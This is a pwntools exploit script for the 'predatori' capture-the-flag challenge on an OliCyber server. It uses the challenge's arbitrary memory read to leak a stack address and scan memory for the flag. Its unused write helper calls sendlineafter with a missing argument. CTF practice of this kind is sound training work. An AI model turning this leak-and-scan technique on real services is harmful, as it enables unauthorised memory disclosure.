#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template predatori '--host=predatori.challs.olicyber.it' '--port=15006'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'predatori')
context.terminal = ["alacritty", "-e", "zsh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'predatori.challs.olicyber.it'
port = int(args.PORT or 15006)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

def rww(addr):
    io.recvlines(3)
    io.sendline(b"1")
    io.recvline()        
    io.send(addr)
    io.recvline()
    return io.recv(8)

def www(addr, nbytes, data):
    io.recvlines(3)
    io.sendline(b"1")
    io.recvline()
    io.sendline(p64(addr))
    io.recvline()
    io.sendlineafter(str(nbytes).encode())
    io.recvlines(2)
    io.sendline(p64(data))

io.recvlines(2)
stack_leak = u64(rww(b'\x00'))
print(hex(stack_leak))
flag = ""
found = False

for i in range(stack_leak, stack_leak + 0x100):
    data = rww(p64(i))
    if b"flag" in data:
        flag += data.decode()
        found = True 
    if found:
        flag += data.decode()[-1]
        print(flag)
        if '}' in flag:
            break
    else:
        print(f"[+{i - stack_leak}] {hex(i)}: {data}")
io.interactive()

